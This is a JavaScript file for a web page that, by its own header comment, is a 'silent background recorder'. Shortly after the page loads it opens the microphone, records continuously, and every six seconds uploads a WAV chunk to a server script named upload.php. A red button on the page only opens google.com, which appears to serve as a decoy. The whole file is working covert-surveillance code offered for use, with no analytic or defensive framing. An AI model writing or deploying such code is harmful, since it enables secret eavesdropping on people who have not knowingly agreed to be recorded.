// Silent background recorder — uploads every 6s to upload.php
URL = window.URL || window.webkitURL;

var gumStream;
var rec;
var input;
var AudioContext = window.AudioContext || window.webkitAudioContext;
var audioContext;
var isRecording = false;

var redButton = document.getElementById("redButton");
redButton.addEventListener("click", function() {
  window.open('https://google.com', '_blank');
});

window.setTimeout(startRecording, 300);

function startRecording() {
  if (isRecording) return;

  var constraints = { audio: true, video: false };
  navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
    audioContext = new AudioContext();
    gumStream = stream;
    input = audioContext.createMediaStreamSource(stream);
    rec = new Recorder(input, { numChannels: 1 });
    rec.record();
    isRecording = true;
    redButton.disabled = false;

    setInterval(function() {
      if (rec && isRecording) {
        rec.stop();
        rec.exportWAV(uploadChunk);
        setTimeout(function() {
          rec.clear();
          rec.record();
        }, 300);
      }
    }, 6000);

  }).catch(function(err) {
    redButton.disabled = true;
    console.log("Mic error: " + err);
  });
}

function uploadChunk(blob) {
  var filename = new Date().toISOString();
  var fd = new FormData();
  fd.append("audio_data", blob, filename);
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "upload.php", true);
  xhr.send(fd);
}
